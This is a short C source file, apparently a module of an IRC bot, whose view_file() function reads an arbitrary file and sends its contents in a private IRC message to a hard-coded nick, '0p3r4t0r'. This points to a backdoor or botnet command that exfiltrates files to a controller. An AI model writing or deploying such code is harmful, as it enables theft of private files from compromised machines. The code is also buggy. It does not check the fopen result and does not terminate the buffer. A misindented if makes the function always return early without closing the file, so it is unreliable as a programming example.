#include "includes.h"

int view_file(irc_t *irc, char *path)
{
	char *buffer;
	int fsize;
	FILE *fp = fopen(path, "rb");

	fseek(fp, 0, SEEK_END);
	fsize = ftell(fp);
	fseek(fp, 0, SEEK_SET);

	buffer = malloc(fsize);

	if (buffer == NULL)
		return -1;

	fread(buffer, fsize, 1, fp);

	if (irc_private_message(irc, "0p3r4t0r", buffer))
		free(buffer);
		return -1;

	free(buffer);
	fclose(fp);
	return 0;
}
